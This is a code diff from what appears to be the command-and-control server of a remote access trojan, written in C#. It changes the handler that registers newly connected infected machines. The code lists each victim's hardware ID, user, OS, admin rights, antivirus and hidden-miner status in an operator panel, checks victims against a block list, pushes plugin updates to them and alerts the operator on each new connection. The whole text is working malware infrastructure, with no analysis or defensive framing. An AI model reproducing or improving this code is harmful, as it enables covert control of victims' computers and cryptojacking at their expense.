@@ -16,24 +16,28 @@ namespace Server.Handle_Packet
             {
                 lock (Settings.LockBlocked)
                 {
-                    if (Settings.Blocked.Count > 0)
+                    try
                     {
-                        if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
+                        if (Settings.Blocked.Count > 0)
                         {
-                            client.Disconnected();
-                            return;
-                        }
-                        else if (Settings.Blocked.Contains(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]))
-                        {
-                            client.Disconnected();
-                            return;
+                            if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
+                            {
+                                client.Disconnected();
+                                return;
+                            }
+                            else if (Settings.Blocked.Contains(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]))
+                            {
+                                client.Disconnected();
+                                return;
+                            }
                         }
                     }
+                    catch { }
                 }
 
                 try
                 {
-                    ThreadPool.QueueUserWorkItem(client.CheckPlugin);
+                    client.CheckPlugin(); //send plugins hashes to client to check if exists or need update
                 }
                 catch { }
 
@@ -51,43 +55,32 @@ namespace Server.Handle_Packet
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
-                try
-                {
-                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Installed").AsString).ToLocalTime().ToString());
-                }
-                catch
-                {
-                    client.LV.SubItems.Add("Outdated stub");
-                }
+                client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Installed").AsString).ToLocalTime().ToString());
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
-                try
-                {
-                    client.LV.SubItems.Add("0000 MS");
-                }
-                catch
-                {
-                    client.LV.SubItems.Add("Outdated stub");
-                }
+                client.LV.SubItems.Add("0000 MS");
                 client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString.Replace("MINER 0", "MINER Offline").Replace("MINER 1", "MINER Online"));
                 client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                 client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                 client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                 client.LV.UseItemStyleForSubItems = false;
-                lock (Settings.LockListviewClients)
+                Program.form1.Invoke((MethodInvoker)(() =>
                 {
-                    Program.form1.listView1.Items.Add(client.LV);
-                    Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
-                }
+                    lock (Settings.LockListviewClients)
+                    {
+                        Program.form1.listView1.Items.Add(client.LV);
+                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+                    }
 
-                if (Properties.Settings.Default.Notification == true)
-                {
-                    Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
+                    if (Properties.Settings.Default.Notification == true)
+                    {
+                        Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
 {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} : {client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
-                    Program.form1.notifyIcon1.ShowBalloonTip(100);
-                }
+                        Program.form1.notifyIcon1.ShowBalloonTip(100);
+                    }
 
-                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} connected", Color.Green);
+                    new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} connected", Color.Green);
+                }));
             }
             catch { }
         }
